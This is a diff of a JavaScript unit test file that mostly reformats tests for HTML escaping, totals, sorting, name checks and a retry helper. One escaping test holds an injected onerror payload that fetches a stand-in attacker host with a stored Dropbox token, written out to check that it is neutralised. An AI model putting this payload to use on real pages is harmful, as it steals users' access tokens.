@@ -13,7 +13,7 @@ const {
     runUpdateWithRetry,
     computeMaxVisibleRows,
     validateAppDataShape,
-    parseAppDataJson
+    parseAppDataJson,
 } = require('../js/logic.js');
 
 test('escapeHtml', async (t) => {
@@ -25,7 +25,10 @@ test('escapeHtml', async (t) => {
         const payload = `x" onerror="fetch('https://evil.example/?t='+localStorage.dropbox_token)`;
         const escaped = escapeHtml(payload);
         assert.ok(!escaped.includes('"'), 'no raw quote should survive to close the attribute');
-        assert.equal(escaped, 'x&quot; onerror=&quot;fetch(&#39;https://evil.example/?t=&#39;+localStorage.dropbox_token)');
+        assert.equal(
+            escaped,
+            'x&quot; onerror=&quot;fetch(&#39;https://evil.example/?t=&#39;+localStorage.dropbox_token)',
+        );
     });
 
     await t.test('neutralizes a script-tag injection payload', () => {
@@ -53,7 +56,7 @@ test('computeTotals', async (t) => {
             { entityId: 'e1', eventId: 'evt1', amount: 10 },
             { entityId: 'e1', eventId: 'evt1', amount: 5.5 },
             { entityId: 'e2', eventId: 'evt1', amount: 3 },
-            { entityId: 'e1', eventId: 'evt2', amount: 999 } // different event, must be excluded
+            { entityId: 'e1', eventId: 'evt2', amount: 999 }, // different event, must be excluded
         ];
         const totals = computeTotals(entities, transactions, 'evt1');
         assert.equal(totals.e1, 15.5);
@@ -82,14 +85,20 @@ test('sortEntitiesByTotal', async (t) => {
         const entities = [{ id: 'a' }, { id: 'b' }, { id: 'c' }];
         const totals = { a: 5, b: 50, c: 20 };
         const sorted = sortEntitiesByTotal(entities, totals);
-        assert.deepEqual(sorted.map((e) => e.id), ['b', 'c', 'a']);
+        assert.deepEqual(
+            sorted.map((e) => e.id),
+            ['b', 'c', 'a'],
+        );
     });
 
     await t.test('does not mutate the input array', () => {
         const entities = [{ id: 'a' }, { id: 'b' }];
         const totals = { a: 1, b: 2 };
         sortEntitiesByTotal(entities, totals);
-        assert.deepEqual(entities.map((e) => e.id), ['a', 'b']);
+        assert.deepEqual(
+            entities.map((e) => e.id),
+            ['a', 'b'],
+        );
     });
 
     await t.test('treats a missing total as 0', () => {
@@ -140,7 +149,7 @@ test('computeGaugeGeometry', async (t) => {
 test('isDuplicateName', async (t) => {
     const entities = [
         { id: 'e1', namePublic: 'Team Alpha' },
-        { id: 'e2', namePublic: 'Team Beta' }
+        { id: 'e2', namePublic: 'Team Beta' },
     ];
 
     await t.test('is case-insensitive and trim-insensitive', () => {
@@ -225,8 +234,11 @@ test('runUpdateWithRetry', async (t) => {
         const result = await runUpdateWithRetry({
             fetchState: async () => calls.push('fetch'),
             updateFn: () => calls.push('update'),
-            saveState: async () => { calls.push('save'); return true; },
-            delay: noDelay
+            saveState: async () => {
+                calls.push('save');
+                return true;
+            },
+            delay: noDelay,
         });
         assert.equal(result.status, 'success');
         assert.deepEqual(calls, ['fetch', 'update', 'save']);
@@ -236,10 +248,17 @@ test('runUpdateWithRetry', async (t) => {
         let updateCalled = false;
         let saveCalled = false;
         const result = await runUpdateWithRetry({
-            fetchState: async () => { throw new Error('network down'); },
-            updateFn: () => { updateCalled = true; },
-            saveState: async () => { saveCalled = true; return true; },
-            delay: noDelay
+            fetchState: async () => {
+                throw new Error('network down');
+            },
+            updateFn: () => {
+                updateCalled = true;
+            },
+            saveState: async () => {
+                saveCalled = true;
+                return true;
+            },
+            delay: noDelay,
         });
         assert.equal(result.status, 'fetch-failed');
         assert.equal(updateCalled, false, 'updateFn must not run against un-refreshed state');
@@ -254,10 +273,12 @@ test('runUpdateWithRetry', async (t) => {
                 fetchCalls++;
                 if (fetchCalls === 2) throw new Error('network blip mid-retry');
             },
-            updateFn: () => { updateCalls++; },
+            updateFn: () => {
+                updateCalls++;
+            },
             saveState: async () => false, // always conflicts, forcing a retry
             delay: noDelay,
-            maxAttempts: 5
+            maxAttempts: 5,
         });
         assert.equal(result.status, 'fetch-failed');
         assert.equal(fetchCalls, 2);
@@ -270,11 +291,20 @@ test('runUpdateWithRetry', async (t) => {
         let updateCalls = 0;
         const delays = [];
         const result = await runUpdateWithRetry({
-            fetchState: async () => { fetchCalls++; },
-            updateFn: () => { updateCalls++; },
-            saveState: async () => { saveAttempts++; return saveAttempts >= 3; },
-            delay: async (ms) => { delays.push(ms); },
-            maxAttempts: 5
+            fetchState: async () => {
+                fetchCalls++;
+            },
+            updateFn: () => {
+                updateCalls++;
+            },
+            saveState: async () => {
+                saveAttempts++;
+                return saveAttempts >= 3;
+            },
+            delay: async (ms) => {
+                delays.push(ms);
+            },
+            maxAttempts: 5,
         });
         assert.equal(result.status, 'success');
         assert.equal(saveAttempts, 3);
@@ -288,9 +318,12 @@ test('runUpdateWithRetry', async (t) => {
         const result = await runUpdateWithRetry({
             fetchState: async () => {},
             updateFn: () => {},
-            saveState: async () => { saveAttempts++; return false; },
+            saveState: async () => {
+                saveAttempts++;
+                return false;
+            },
             delay: noDelay,
-            maxAttempts: 3
+            maxAttempts: 3,
         });
         assert.equal(result.status, 'conflict-exhausted');
         assert.equal(saveAttempts, 3);
@@ -303,9 +336,14 @@ test('runUpdateWithRetry', async (t) => {
         const result = await runUpdateWithRetry({
             fetchState: async () => {},
             updateFn: () => {},
-            saveState: async () => { saveAttempts++; throw authError; },
-            delay: async () => { delayCalls++; },
-            maxAttempts: 5
+            saveState: async () => {
+                saveAttempts++;
+                throw authError;
+            },
+            delay: async () => {
+                delayCalls++;
+            },
+            maxAttempts: 5,
         });
         assert.equal(result.status, 'save-failed');
         assert.equal(result.error, authError);
